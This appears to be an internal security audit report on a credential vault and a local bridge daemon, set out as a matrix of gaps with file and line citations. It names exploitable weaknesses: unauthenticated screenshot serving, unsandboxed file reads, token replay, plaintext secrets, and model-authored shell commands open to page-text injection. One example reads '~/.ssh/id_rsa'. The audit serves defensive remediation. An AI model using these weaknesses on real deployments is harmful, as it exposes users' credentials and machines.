# Cofre / automation discovery gate - Part C report

**Run 2026-07-27.** Scope: `ekoa-code` (live Cortex) and `ekoa-bridge`. Read-only; no code was changed by the gate.

Seven audits (D1-D7) ran in parallel, each followed by an adversarial verifier whose job was to refute it, then a synthesis pass that merged them and a completeness critic that hunted what all seven missed. 16 agents, no errors.

## How to read the verdicts

Per the brief: `conforms` (matches the target architecture) / `diverges` (exists but differs, with the violated invariant named) / `absent`. Auditors were instructed to be stingy - a partial implementation is `diverges`, not `conforms`.

**No element survived as `conforms`.** Final tally: 34 `diverges`, 23 `absent`, 10 `unresolved`. The `unresolved` rows are claims whose cited evidence did not check out, or scope no audit examined; they are listed with the action that closes each.

## Scope correction applied before the run

The brief's D1 says "inspect ekoa-mono". `ekoa-monorepo` is stale (last commit 2026-02-18, pre-rebuild, folders `cortex/ acervo/ automato/ garra/ iris/`). The audits were pointed at `ekoa-code` as the live Cortex instead, and `ekoa-monorepo` was excluded.

## Corrections applied after the completeness pass

The completeness critic found that the gate scored several elements `absent` while shipped, e2e-tested equivalents exist that no audit opened. Verified directly against the code:

| Gate said | Actually shipped |
|---|---|
| Cofre UI `absent / build-fresh / large` | `web/lib/navigation.ts:66-81` ships `/settings/privacy` and `/settings/api-keys` nav entries; `web/app/(dashboard)/settings/privacy/page.tsx:47-53` composes `GrantsSection`, `LedgerSection`, `MaskingSummarySection`, `ApprovedCommandsSection`, `BridgeStatusSection` |
| No per-item last-used, no lock-now, none of the eleven registo events | `api/src/auth/gateway-keys-service.ts` ships mint (`:53`), list (`:81`), revoke (`:97`), fail-closed verify (`:110`), throttled `lastUsedAt` (`:121`), per-key `caps`, and `logActivity(actor,'security','gateway_key_minted'\|'gateway_key_revoked')` at `:67`/`:102` |
| Grant UI absent | `web/e2e/privacy-grants-ledger.spec.ts` and `web/e2e/gateway-keys.spec.ts` are shipped, passing specs |

**Consequence:** D1 elements (b), (f) and (i) are `diverges / close-gaps`, not `absent / build-fresh`, and the v1 build is "generalize the gateway-key item lifecycle to a typed item model", not greenfield. Effort on the UI and event plumbing drops from large to medium. The matrix below retains the original verdicts as filed; this table supersedes them.

The critic also flagged, with zero citations anywhere in the gate, an entire live credential-custody plane: `api/src/integrations/platform-oauth.ts` (encrypted-at-rest OAuth bundle with refresh-on-expiry and singleflight rotation), `m365-proxy.ts` (a fixed injector where the served app never sees the token - the closest shipped analogue of the I9 primitive), `prefetch.ts` (OAuth content injected into the chat system prompt), `app-sso-sessions.ts`, `pipedream.ts`. That surface holds refresh tokens today and got no verdict. It needs a D8.

## Independently verified before publication

Every claim below was re-read at the cited line by the main session, not taken from an agent report:

- `api/src/automation/platform-primitives.ts:324-330` - `resolveUserPath` applies no containment (`if (isAbsolute(path)) return path;`); `file.read` at `:207-212` puts the bytes into `ctx.captured`
- `api/src/data/crypto.ts:19-25` - one global key, `sha256(ENCRYPTION_KEY)`; the file header calls KMS envelope "P-14, deferred" at `:5-6`
- `api/src/bridge/signing.ts:24` - delegated-task HMAC keyed by `loadConfig().jwtSecret`
- `ekoa-bridge/src/auth/credentials.ts:36-47,86-91` - `signingSecret` and platform tokens in plaintext `config.json` (0600)
- `api/src/llm/client.ts:967-968` vs `:981` - prompt and system are anonymised; `images: opts.images` is forwarded verbatim
- `api/src/server.ts:920` - `express.static('/automation-screenshots')`, no auth middleware
- `revokePairing` - defined at `api/src/bridge/registry.ts:203`, re-exported at `index.ts:35`, no production caller
- `api/tests/SUITE_LEDGER.json` - no security or privacy suite class exists, despite `CLAUDE.md` mandating named security suite classes
- `scrubCredentials`, `redactSecretsDeep`, `collectSecretValues`, `maskValue`, `decryptCredentialFields`, `resolveUserPath` - **zero** test files each

Two refinements to what the audits reported:

1. The unauthenticated screenshot mount is a **logged decision** (`api/src/server.ts:915-920` cites `decisions.md`, reasoning that `<img>` cannot carry an Authorization header), not an oversight. Fixing it is a decision reversal, not a bug fix.
2. The bridge `signingSecret` problem is worse than "plaintext on disk": nothing in `ekoa-bridge` ever **writes** it. `pair.ts:72` only preserves an existing value; `serve.ts:84` falls back to `''`. Delegated-task signature verification is therefore inert in any deployment where an operator has not hand-copied `JWT_SECRET` onto the laptop.

## Audit reliability note

**D6 (portal survey) is unverified.** It is the only audit whose adversarial verifier did not run, and its central findings rest on live network probes that cannot be re-checked from code. Its code-side claims were verified and hold. Treat every rail conclusion - mTLS-only mandatario access, non-resolving IRN hostnames, the OA Roundcube form login, the civilonline captcha - as a hypothesis requiring a live re-probe before anything is budgeted against it.

---
## Corrected status matrix

67 elements. Verdicts are the verifier-corrected ones: where an adversarial pass downgraded a `conforms`, the downgrade stands.

| Audit | Element | Verdict | Decision | Effort | Violates | Evidence |
|---|---|---|---|---|---|---|
| D1 | (a) Vault storage layer - KMS envelope, per-tenant DEK, Firestore ciphertext, RAM-only decrypt, zeroization | diverges | close-gaps | large | Target storage decision (KMS envelope, per-tenant DEK), I4 (no zeroization; decrypted platform credential memoized process-wide), Cofre item model (unit of storage is an opaque configValues blob, no item type, no bound origin, no state, no last-used) | `api/src/data/crypto.ts:19-25`<br>`api/src/data/crypto.ts:47-62`<br>`api/src/integrations/service.ts:80`<br>`api/src/integrations/service.ts:113`<br>`api/src/integrations/action-executor.ts:271-282`<br>`api/src/llm/credentials.ts:200-215`<br>`api/src/data/mongo.ts:2-7` |
| D1 | (b) Grant model and scopes (this-run-only / TTL / until-locked), per-credential vs vault-wide | absent | build-fresh | large | - | `api/src/integrations/service.ts:63-70`<br>`api/src/bridge/delegation.ts:36-42`<br>`/Users/ggomes/Projects/ekoa-bridge/src/auth/grants-store.ts:4-7`<br>`/Users/ggomes/Projects/ekoa-bridge/src/auth/grants-store.ts:15-23` |
| D1 | (c) Policy-lock seam - single seam for the grant check, upgradeable to a key-share requirement | absent | build-fresh | medium | - | `api/src/data/crypto.ts:19-25`<br>`api/src/integrations/action-executor.ts:146`<br>`api/src/integrations/action-executor.ts:271-282` |
| D1 | (d) Typist primitive - origin binding, CDP out-of-band fill, atomic fill-and-submit, no read-back, per-site recipes, fail-to-relay | absent | build-fresh | large | - | `api/src/automation/executor.ts:180-198`<br>`api/src/automation/executor.ts:199-207`<br>`api/src/automation/template-vars.ts:44-55`<br>`api/src/streaming/cdp.ts:76`<br>`api/src/streaming/cdp.ts:96-103`<br>`api/src/streaming/session.ts:349-359`<br>`api/src/automation/engine.ts:1789-1850` |
| D1 | (e) Redaction pipeline coverage - logs, traces, HAR, video, console, memory output | diverges | close-gaps | large | I2 (two divergent private copies of a per-executor masker; no shared run-scoped secret registry; no ingress filter), I2 (maskValue leaks leading token + last 4 chars; <4-char floor; literal substring only), I2 (screenshots persisted + unauthenticated mount, no login-window suppression), I2/I9 (no Cortex-ingress filter for bridge output; bridge fsyncs full command lines), I3 (memory pipeline's only credential exclusion is a sentence in a prompt), I1+I2 (planner echoes the first 50 chars of an offending token to log, model and client) | `api/src/integrations/http-template.ts:71-78`<br>`api/src/integrations/http-template.ts:110-131`<br>`api/src/automation/executors/api-call.ts:106-121`<br>`api/src/automation/executors/api-call.ts:169-177`<br>`api/src/automation/executors/api-call.ts:238-263`<br>`api/src/automation/run-events.ts:30-43`<br>`api/src/automation/engine.ts:1689-1703`<br>`api/src/memory/extraction.ts:70-79`<br>`/Users/ggomes/Projects/ekoa-bridge/src/ledger/ledger.ts:72-89` |
| D1 | (f) Cofre UI area - left-menu item, item types, states, last-used, lock-now, lock-all | absent | build-fresh | large | - | `web/lib/navigation.ts:49-90`<br>`api/src/routes/integrations.ts:72-89` |
| D1 | (g) Unlock / consent page with durations (Apenas esta execução … Até eu bloquear; no TTL UI for signature identities) | absent | build-fresh | medium | - | `api/src/automation/consent.ts:1-12`<br>`api/src/automation/consent.ts:28-46`<br>`api/src/automation/executors/local-command.ts:96-105`<br>`api/src/automation/engine.ts:579-592` |
| D1 | (h) Relay page and its protocol-level operation typing (login vs signature) | absent | build-fresh | large | - | `api/src/automation/engine.ts:1806-1830`<br>`api/src/automation/vision.ts:293-301`<br>`web/components/automations/pause-for-user-overlay.tsx:12-21`<br>`web/components/automations/pause-for-user-canvas.tsx:1-18`<br>`shared/src/events.ts:147-154`<br>`shared/src/events.ts:156-161`<br>`api/src/streaming/session.ts:1-8` |
| D1 | (i) Registo events for the Cofre (grant issued, unlocked, used, session established/refreshed/expired, relay completed, lock-now, global lock, bridge secret delivery, attended ceremony) | diverges | close-gaps | medium | Registo minimum event set (none of the eleven Cofre events exist; the automation engine writes NO activity row at all; an ordinary integration credential create/update writes none), I2 metadata-only claim (RegistoEntry is .passthrough(), so a Cofre event carrying a VALUE would validate - 'metadata only' is a route-docstring convention, not a schema guarantee), Bridge-side events identical in shape to cloud events (the bridge ledger is a different record family and reaches Cortex only as TTL-bounded, never-persisted display metadata; grant issuance/revocation is absent from the ledger union entirely) | `shared/src/registo.ts:15-23`<br>`api/src/routes/registo.ts:22-35`<br>`api/src/data/activity.ts:21-42`<br>`api/src/services/platform-crud.ts:17-20`<br>`api/src/routes/integrations.ts:65-82`<br>`/Users/ggomes/Projects/ekoa-bridge/src/ledger/ledger.ts:92-99` |
| D1 | (j) FORMER E4 - earlier Google Secret Manager attempt (secretmanager / SecretManagerServiceClient / projects/*/secrets) | absent | build-fresh | small | - | `api/src/data/crypto.ts:1-8`<br>`deploy/validate-topology.sh:34`<br>`deploy/validate-topology.sh:44`<br>`docs/security.md:283`<br>`docs/governance.md:46` |
| D1 | EXTRA · Session-first storage - storageState blobs as credential-equivalent, per-tenant/per-site encrypted, refreshed each run, session metadata + egress binding | absent | build-fresh | large | - | `api/src/routes/integrations.ts:91-123`<br>`api/src/automation/local-browser-session.ts:57-74`<br>`api/src/automation/local-browser-session.ts:119-147`<br>`api/src/integrations/action-executor.ts:260`<br>`api/src/server.ts:862`<br>`api/src/server.ts:461-464` |
| D1 | EXTRA · Bridge secret delivery + capability registry (I9, protocol v2: capabilities, secret.deliver, attended.request, session.push, capability grants) | absent | build-fresh | large | - | `shared/src/ekoa-local.ts:218-232`<br>`api/src/bridge/registry.ts:22-41`<br>`api/src/bridge/signing.ts:1-30`<br>`api/src/bridge/provider.ts:10-17`<br>`api/src/bridge/token.ts:1-16`<br>`api/src/bridge/activity-buffer.ts:1-15` |
| D2 | (a) Websocket message set - every implemented type, both directions, mapped onto the target families | diverges | close-gaps | large | protocol-v2 register/hello (ABSENT - registration is a URL path segment + JWT claim at the HTTP Upgrade; the daemon never announces version, OS or tools), protocol-v2 tool.invoke with streamed results (PARTIAL and wrongly shaped - one `delegate` carrying an opaque whole-batch TaskProgram, one terminal `delegation_result`; ledger_row streams read METADATA only and is sent AFTER the program finishes), protocol-v2 secret.deliver (ABSENT - no one-time payload channel of any kind), protocol-v2 attended.request (ABSENT), protocol-v2 session.push (ABSENT - no frame carries a storageState in either direction), I8 (the wire has no operation type at all; `type` names a transport action, so login-vs-signature cannot be expressed) | `shared/src/ekoa-local.ts:218-232`<br>`/Users/ggomes/Projects/ekoa-bridge/src/wire/contract.ts:80-93`<br>`api/src/bridge/server.ts:226-260`<br>`/Users/ggomes/Projects/ekoa-bridge/src/runtime/daemon-runtime.ts:121-128`<br>`/Users/ggomes/Projects/ekoa-bridge/src/transport/bridge-socket.ts:188-189`<br>`api/src/bridge/server.ts:250-254`<br>`api/src/bridge/server.ts:194` |
| D2 | (b) Auth model - token issuance, rotation, signing, replay protection | diverges | close-gaps | medium | bridge-transit rule / least privilege (no replay protection at connect: no jti, no nonce store, no client binding; redial evicts the incumbent, so a captured 600 s token takes over the delegate stream), least privilege / key separation (DelegatedTask HMAC keyed by the platform JWT secret, which the daemon must hold verbatim), revocation (revokePairing has NO production caller - tests only; unpair is local-only; bridge tokens never consult tokenEpoch, so session revocation does not kill a live socket), operational correctness (nothing ever WRITES signingSecret; an empty secret denies every delegation), operational correctness (token freshness is dial-scoped, not use-scoped - after 600 s every provider_request presents an expired credential), defence in depth (?token= in the connect URL is still accepted with no consumer) | `api/src/bridge/token.ts:44-52`<br>`api/src/bridge/token.ts:61-85`<br>`api/src/bridge/registry.ts:105-113`<br>`api/src/bridge/signing.ts:24`<br>`api/src/bridge/registry.ts:203`<br>`api/src/bridge/index.ts:35`<br>`/Users/ggomes/Projects/ekoa-bridge/src/cli/commands/unpair.ts:4-6`<br>`api/src/auth/middleware.ts:33-49`<br>`api/src/bridge/server.ts:99-100`<br>`/Users/ggomes/Projects/ekoa-bridge/src/cli/commands/serve.ts:74`<br>`/Users/ggomes/Projects/ekoa-bridge/docs/decisions.md:26-29` |
| D2 | (c) Machine identity + registry of connected bridges (tenant binding, health) | diverges | close-gaps | medium | protocol-v2 machine identity (self-asserted, cosmetic: the daemon picks its own pairingId and Cortex mints a token for ANY /^[A-Za-z0-9._-]{1,128}$/ string; no attestation, no key pair, one user can invent unlimited 'machines'), protocol-v2 capability list (no capability field on PairingRow or LiveConnection), protocol-v2 durable registry (the live half is a process-local Map; presence and heartbeat vanish on restart and are wrong under any horizontal scale), router (selection is 'newest live socket for this owner', used unconditionally; no pinning, no capability match), tenant binding is per-USER, not per-tenant (the only listing is getPairingsByOwner behind an owner-scoped route; an org admin cannot enumerate, audit or manage the org's paired machines, and there is no cap on pairings) | `api/src/bridge/registry.ts:22-28`<br>`api/src/bridge/registry.ts:32-41`<br>`api/src/bridge/registry.ts:93-96`<br>`api/src/bridge/registry.ts:150-160`<br>`api/src/bridge/registry.ts:5-14`<br>`/Users/ggomes/Projects/ekoa-bridge/src/cli/commands/pair.ts:23-26`<br>`api/src/routes/bridge.ts:14-29`<br>`api/src/bridge/delegation.ts:114` |
| D2 | (d) Capability advertisement + per-tenant-per-machine capability GRANTS (allowlist, default deny) | absent | build-fresh | large | - | `shared/src/ekoa-local.ts:218-232`<br>`api/src/bridge/registry.ts:22-41`<br>`/Users/ggomes/Projects/ekoa-bridge/src/auth/grants-store.ts:15-23`<br>`/Users/ggomes/Projects/ekoa-bridge/src/surface/local-server.ts:8-16`<br>`/Users/ggomes/Projects/ekoa-bridge/src/surface/browser-grants.ts:41-66`<br>`/Users/ggomes/Projects/ekoa-bridge/src/tools/tier2/index.ts:22-27`<br>`api/src/automation/consent.ts:28-45` |
| D2 | (e) Audit trail of every invocation; approval flow for bash/filesystem/desktop automations | diverges | close-gaps | medium | protocol-v2 full audit trail (Cortex persists NOTHING; only kind==='read' rows leave the machine; hosted-side they land in a 15-min TTL Map that is display metadata only; no registo event for delegation dispatch, grant use, denial or revoke), protocol-v2 approval flow (the write-approval `confirmed` flag is MODEL-asserted while the daemon comment claims a Cortex-side human assent; nothing Cortex-side checks it), protocol-v2 approval flow for bash/desktop (the path does not exist - per-session automation enablement is in-memory, off by default, and instantiated nowhere in src), I2 latent (the ledger records the full bash command line and full browser navigation target verbatim and fsyncs it), grant issuance/revocation is UNAUDITED on both sides - the LedgerRow union has no grant kind, and Cortex treats grantRefs as opaque | `/Users/ggomes/Projects/ekoa-bridge/src/ledger/ledger.ts:92-99`<br>`/Users/ggomes/Projects/ekoa-bridge/src/ledger/ledger.ts:145-158`<br>`/Users/ggomes/Projects/ekoa-bridge/src/runtime/daemon-runtime.ts:122-126`<br>`api/src/bridge/activity-buffer.ts:1-15`<br>`api/src/server.ts:1015-1020`<br>`/Users/ggomes/Projects/ekoa-bridge/src/tools/write.ts:10-11`<br>`api/src/agents/sdk-tools.ts:111-112`<br>`/Users/ggomes/Projects/ekoa-bridge/src/surface/browser-grants.ts:41-70` |
| D2 | (f) Secret handling on bridge paths - does any secret-adjacent value reach bridge disk, bridge logs, or a persisted queue | diverges | close-gaps | large | I4 + bridge-transit rule (access/refresh token AND signingSecret in plaintext config.json; no encryption, no keychain, no zeroization, no use-window), I4 + key separation (a working deployment puts the platform-wide JWT signing secret on every user's laptop), I2 (no redaction/masking pipeline anywhere in ekoa-bridge/src and none at Cortex ingress; maskedCounts is hard-coded {}; bash stdout/stderr returned unfiltered while the full command line is fsynced), bridge-transit rule (the bridge token is cached in a module-scope `let lastToken`, re-sent on EVERY provider_request, never zeroized), I9 (no secret-delivery primitive at all; bash.ts scrubs the child env to 7 names, so any real use would force the value into the command string, which is then ledgered verbatim), I1/I2 (raw file CONTENT crosses the socket into the model via compose(); the containment resolver has NO .env/.ssh/credentials denylist) | `/Users/ggomes/Projects/ekoa-bridge/src/auth/credentials.ts:36-47`<br>`/Users/ggomes/Projects/ekoa-bridge/src/auth/credentials.ts:86-91`<br>`api/src/bridge/signing.ts:24`<br>`/Users/ggomes/Projects/ekoa-bridge/src/cli/commands/serve.ts:74`<br>`/Users/ggomes/Projects/ekoa-bridge/src/runtime/daemon-runtime.ts:135-141`<br>`/Users/ggomes/Projects/ekoa-bridge/src/engine/engine.ts:184-205`<br>`/Users/ggomes/Projects/ekoa-bridge/src/containment/resolver.ts:22-45`<br>`/Users/ggomes/Projects/ekoa-bridge/src/tools/tier2/bash.ts:17-44`<br>`api/src/auth/jwt.ts:35`<br>`api/src/auth/device.ts:102-105` |
| D2 | (g) Reconnect, health, offline detection | diverges | close-gaps | small | protocol-v2 offline fallback per run (exactly ONE outcome: terminalResult('unreachable'); no queue, no retry policy, no datacenter-egress fallback, and no way for the caller to express a preference), protocol-v2 registry health (boolean + timestamp in process memory; no version, load, capability health or egress health), protocol-v2 heartbeat carries state (pure liveness, no payload, so it cannot refresh capabilities, report expiry, or advertise a tailnet address) | `/Users/ggomes/Projects/ekoa-bridge/src/transport/bridge-socket.ts:103-141`<br>`/Users/ggomes/Projects/ekoa-bridge/src/transport/bridge-socket.ts:213-234`<br>`/Users/ggomes/Projects/ekoa-bridge/src/transport/bridge-socket.ts:242-256`<br>`api/src/bridge/server.ts:265-287`<br>`api/src/bridge/delegation.ts:112-115`<br>`api/src/bridge/delegation.ts:86-90`<br>`api/src/bridge/registry.ts:181-191` |
| D2 | Automation capability RPC (browser/bash `runStep`) - the second, older daemon path | diverges | close-gaps | large | protocol-v2 tool.invoke with streamed results (a COMPLETE second protocol shape exists on paper - DaemonConnection.runStep({capability, input, stepId, runId}) returning a ResultEnvelope with observation/screenshotB64/streamed chunks - with both consumers fully written, but setDaemonConnectionResolver is never called in src, so getDaemonConnection always returns null and every browser/bash step halts in awaiting_daemon), cross-repo parity (no counterpart frame; the bash/browser tools that would serve it are the Tier-2 registry, which no protocol handler exposes - dead on BOTH ends) | `api/src/automation/seams.ts:22-63`<br>`api/src/automation/executors/local-command.ts:118-157`<br>`api/src/automation/browser-session.ts:12`<br>`api/src/server.ts:465`<br>`api/src/automation/engine.ts:1244-1256`<br>`shared/src/events.ts:168-173`<br>`/Users/ggomes/Projects/ekoa-bridge/src/tools/tier2/index.ts:22-27` |
| D2 | Data plane - Tailscale egress, bridge-advertised tailnet address, cloud browser proxying through a selected machine | absent | build-fresh | large | - | `shared/src/ekoa-local.ts:218-232`<br>`api/src/bridge/registry.ts:22-41`<br>`/Users/ggomes/Projects/ekoa-bridge/src/surface/local-server.ts:229-238` |
| D3 | (a) Where a browser session blob is persisted; encrypted at rest; under whose key | absent | build-fresh | large | - | `api/src/routes/integrations.ts:99-123`<br>`api/src/integrations/action-executor.ts:260`<br>`api/src/server.ts:862`<br>`api/src/data/stores.ts:129`<br>`api/src/data/stores.ts:194`<br>`api/src/data/crypto.ts:19-25` |
| D3 | Session-injection primitive (extractSessionCookies / injectSessionState) | diverges | close-gaps | medium | I6 (addCookies takes whatever domains the payload carries - no registered-origin list, no eTLD+1 check, no refusal), I4 (the BrowserContext is never closed; dispose() closes only the page, so the cookie jar survives for the process lifetime; sessionState is held on the instance for the whole run), session-first coverage (localStorage `origins` seeding is explicitly out of scope, so a token-in-localStorage site cannot be resumed), bridge parity (the daemon path deliberately does NOT forward the session - 'the bridge protocol has no cookie channel yet' - and localBrowserEnabled defaults OFF in production, so in production this primitive never runs) | `api/src/automation/local-browser-session.ts:57-74`<br>`api/src/automation/local-browser-session.ts:126-128`<br>`api/src/automation/local-browser-session.ts:133-147`<br>`api/src/automation/local-browser-session.ts:149-154`<br>`api/src/automation/engine.ts:345-349`<br>`api/src/automation/config.ts:41` |
| D3 | (d) Per-tenant AND per-site session scoping; per-context cloning for parallel automations | diverges | build-fresh | medium | per-tenant/per-site scoping (there is no per-site dimension at all; the only handle is ownerUserId and the composition root's provider IGNORES it, returning a fresh anonymous context from a process-wide Chromium), review integrity (the module docblock documents 'one page per session, opened in the owner's persistent context… they share cookies/consent' - the shipped composition is neither persistent nor per-owner), I4 (every run leaks a live BrowserContext holding that run's cookies into the shared browser for its lifetime) | `api/src/server.ts:461-464`<br>`api/src/automation/seams.ts:296-315`<br>`api/src/automation/local-browser-session.ts:9`<br>`api/src/automation/local-browser-session.ts:101-104`<br>`api/src/automation/engine.ts:327` |
| D3 | (e) Session expiry detection, auto re-establishment, re-auth prompt | absent | build-fresh | medium | - | `api/src/automation/vision.ts:83`<br>`api/src/automation/vision.ts:301-317`<br>`api/src/automation/rehearsal.ts:379-415`<br>`api/src/automation/engine.ts:1812-1846` |
| D3 | (f) Session metadata: establishing machine/context, bound egress, UA/fingerprint profile, health/expiry | absent | build-fresh | medium | - | `api/src/automation/fingerprint.ts:10-15`<br>`api/src/automation/fingerprint.ts:82-110`<br>`api/src/services/browser-pool.ts:32`<br>`api/src/server.ts:461-464` |
| D3 | Bridge path: session state, session.push, session-equivalent material on bridge disk | absent | build-fresh | large | - | `/Users/ggomes/Projects/ekoa-bridge/src/tools/tier2/browser.ts:29-62`<br>`/Users/ggomes/Projects/ekoa-bridge/src/auth/credentials.ts:36-47`<br>`/Users/ggomes/Projects/ekoa-bridge/src/ledger/ledger.ts:72-89`<br>`/Users/ggomes/Projects/ekoa-bridge/src/tools/tier2/context.ts:52-71`<br>`api/src/automation/engine.ts:345-349` |
| D4 | (a) Complete inventory of implemented step types | diverges | close-gaps | medium | Router (a Step has NO capability declaration, NO target field, NO attended-or-unattended flag, NO credential-reference field), I9 (no step type can express 'deliver credential ref R into this process's environment'; the only secret-adjacent fields are plain strings the model writes), contract gap (shared/src/automations.ts PlanStep is {stepId?, index?, description?, tool?, argv?} with .passthrough() and no type discriminator - the zod boundary validates NOTHING about step content, and any credential-reference/capability/target field must land here in the same PR) | `api/src/automation/types.ts:159-168`<br>`api/src/automation/types.ts:241-272`<br>`api/src/automation/engine.ts:1157-1292`<br>`shared/src/automations.ts:22-31` |
| D4 | (a) Execution locus per step type (cloud / bridge / either) | diverges | close-gaps | medium | Router (locus is a global fallback ladder, not a per-step declaration: daemon if connected, else in-process Playwright on the CORTEX host if localBrowserEnabled, else halt awaiting_daemon), protocol v2 (setDaemonConnectionResolver is never wired, so local_command is unreachable end-to-end and browser steps only ever run on the cloud host) | `api/src/automation/engine.ts:329-356`<br>`api/src/automation/config.ts:21-22`<br>`api/src/automation/config.ts:38-41`<br>`api/src/server.ts:465`<br>`api/src/automation/executors/local-command.ts:118-129` |
| D4 | (b) The bash/shell step: existence and MODEL AUTHORSHIP of the command string | diverges | close-gaps | large | I5 (the command string is 100% model-authored; the planner prompt teaches the LLM to emit ["bash","-c","<script>"], and the MID-RUN rehearsal fixer can insert or replace a local_command with arbitrary argv, so the model authors executable code at RUN time), I9 (no distinction between a fixed audited primitive and model-authored step content - the same free-form argv is both), I9 consent scope (normalizeArg collapses every path-shaped argument to <FILE>/<DIR>, so approving `cat <FILE>` silently approves `cat ~/.ssh/id_rsa` forever; only the bash -c family binds to the exact script), I5 (approvals are userId::shape rows with no machine binding, no tenant scoping, no TTL and no per-credential grant) | `api/src/automation/planner.ts:147-148`<br>`api/src/automation/planner.ts:171-173`<br>`api/src/automation/planner.ts:395-405`<br>`api/src/automation/rehearsal.ts:223-226`<br>`api/src/automation/rehearsal.ts:278-289`<br>`api/src/automation/command-shape.ts:39-43`<br>`api/src/automation/command-shape.ts:52-68`<br>`api/src/automation/consent.ts:23-29` |
| D4 | (b) Can a secret value be interpolated into a command string today? | diverges | close-gaps | large | I9 (YES - argv, cwd AND stdin are interpolated with `inputs`; only {{input.credentials...}} is redacted, so any plain {{input.<name>}} substitutes verbatim), I9 (runAutomationForAction does Object.assign(inputs, input.args) when a binding has no argMap, so an agent-supplied tool argument becomes a top-level input), I1/I9 (a verify step's vision verifier merges arbitrary page text into the shared inputs map - an unsanitised model→shell path and a command-injection vector inside a bash -c body), I2/I4 (the interpolated argv is persisted uncredacted in the run record's consentRequest and in resolvedAction; stdin likewise) | `api/src/automation/template-vars.ts:44-55`<br>`api/src/automation/executors/local-command.ts:83-87`<br>`api/src/automation/service.ts:676`<br>`api/src/automation/engine.ts:1616-1624`<br>`api/src/automation/command-shape.ts:39-43`<br>`api/src/automation/types.ts:489-497` |
| D4 | (d) Existing environment-variable injection primitive for steps | diverges | close-gaps | large | I9 (the only env channel reads the CORTEX API SERVER's process.env by a model-supplied name list and ships the VALUES to a user machine - the inverse of the primitive), I5 (envWhitelist is planner-authorable with no allowlist of permissible names), I9 (there is no path from an encrypted credential item to a process environment; loadIntegrationCredentialFields is called only by api-call.ts) | `api/src/automation/types.ts:188-193`<br>`api/src/automation/executors/local-command.ts:146`<br>`api/src/automation/executors/local-command.ts:253-261`<br>`api/src/automation/planner.ts:403`<br>`api/src/automation/rehearsal.ts:283-288`<br>`/Users/ggomes/Projects/ekoa-bridge/src/tools/tier2/bash.ts:17-19` |
| D4 | (c) Step outputs → LLM context | diverges | close-gaps | medium | I1 (a failing local_command's error message embeds three lines of STDERR verbatim and is handed to the fixer LLM with no redaction), I1 (extractActionRunOutput returns the last api_call responseBody or the UNREDACTED ekoa_action `result` as the tool result of an agent-invoked automation), I1 (assertion-failure errors embed 200 chars of live innerText and the raw URL, and reach the fixer prompt, the SSE stream and the persisted step record) | `api/src/automation/executors/local-command.ts:234`<br>`api/src/automation/engine.ts:784-795`<br>`api/src/automation/rehearsal.ts:146-148`<br>`api/src/automation/service.ts:637-653`<br>`api/src/automation/service.ts:692-693`<br>`api/src/automation/executor.ts:287-299` |
| D4 | (c) Step outputs → logs, SSE run events, persisted run records; redaction coverage | diverges | close-gaps | large | I2 (automationStepEventPayload forwards record.output and record.error.details VERBATIM onto SSE; its header comment claims 'error details are already redacted at the executor', true only for api_call), I2 (live stdout chunks stream to the UI unfiltered; no byte-stream filter between process and client), I4 (the whole StepRecord - stdout, stderr, responseBody, resolvedAction.argv/stdin, capturedValues - is written to automation_runs in cleartext with no envelope or field-level crypto), I2 (verifier-extracted page values are console.log'd verbatim), I2 (the /automation-screenshots mount has NO auth middleware and no tenant check) | `api/src/automation/run-events.ts:30-43`<br>`api/src/automation/executors/local-command.ts:154-157`<br>`api/src/automation/persistence.ts:37-54`<br>`api/src/data/stores.ts:191`<br>`api/src/automation/engine.ts:1621`<br>`api/src/automation/service.ts:105-121`<br>`api/src/server.ts:912-920` |
| D4 | (c) Step outputs / resolved actions → the memory pipeline | diverges | close-gaps | medium | I3 (no non-memorable class; the whole resolved PlaywrightAction is persisted into organizational memory), I3/I1 (the fill value's first 40 chars, and the FULL navigate URL and FULL select value, go into the term-scored `content` field and round-trip memory → vision prompt AND memory → general chat agent prompt), I3 (shared:true sets visibility 'org'; but a PRIVATE row already reaches the chat agent, so org visibility is not required for cross-surface exposure), I4 (the memories store is plaintext Mongo with no crypto) | `api/src/automation/cache.ts:104-140`<br>`api/src/automation/cache.ts:257`<br>`api/src/automation/cache.ts:260`<br>`api/src/automation/cache.ts:264`<br>`api/src/memory/resolver.ts:90-92`<br>`api/src/agents/context.ts:156-159`<br>`api/src/automation/engine.ts:1342`<br>`api/src/automation/engine.ts:1512` |
| D4 | (e) Model-authored content authoring credential-touching code / command strings (I5) | diverges | close-gaps | large | I5 (the fixer LLM authors executable steps mid-run: local_command argv/cwd/stdin, api_call method/url/headers/body, ekoa_action slug/capability/inputs, with none of the plan checks applied), I5+I1 (a fixer patch can name an authIntegrationKey whose credentials Cortex DECRYPTS and interpolates into a URL the SAME MODEL wrote), I5 (the planner prompt teaches the credential-interpolation syntax rather than reserving injection to a fixed primitive), I5+I1+I2+I4 (ekoa_action's resolveUserPath applies NO sandbox - model-authored manifests get unrestricted file.read/file.write on the Cortex host; read bytes land in persisted capturedValues and in the agent's tool result) | `api/src/automation/rehearsal.ts:246-252`<br>`api/src/automation/rehearsal.ts:278-317`<br>`api/src/automation/rehearsal.ts:304`<br>`api/src/automation/planner.ts:649-665`<br>`api/src/automation/platform-primitives.ts:324-330`<br>`api/src/automation/platform-primitives.ts:207-220`<br>`api/src/automation/executors/ekoa-action.ts:165-174`<br>`api/src/automation/service.ts:650` |
| D4 | (e) Origin binding on credential use (api_call authIntegrationKey) | absent | build-fresh | medium | I6 (nothing compares the resolved request URL's origin against any registered origin; guardedFetch blocks only private/loopback/link-local/metadata, so every PUBLIC host is accepted) | `api/src/automation/executors/api-call.ts:65-96`<br>`api/src/automation/executors/api-call.ts:126-135`<br>`api/src/integrations/action-executor.ts:292-295`<br>`api/src/integrations/action-executor.ts:328-332`<br>`api/src/automation/rehearsal.ts:304` |
| D4 | (d) Bridge control-plane wiring for secret-bearing non-browser steps (tool.invoke / secret.deliver) | absent | build-fresh | large | protocol-v2 message families (no register/hello, tool.invoke, secret.deliver, attended.request or session.push; DaemonConnection.runStep has no counterpart frame), bridge transit rule (no one-time-payload channel, no RAM-only-then-zeroize discipline, no defined path for a credential to reach a bash step), registry (no advertised capability list, no per-tenant per-machine capability grants, no allowlist/default-deny, no invocation audit), I9 (nothing on the Cortex ingress path knows the live secret values for a bash step, so no filter can exist) | `api/src/automation/seams.ts:38-50`<br>`api/src/server.ts:465`<br>`/Users/ggomes/Projects/ekoa-bridge/src/wire/contract.ts:80-94`<br>`api/src/bridge/registry.ts:22-41` |
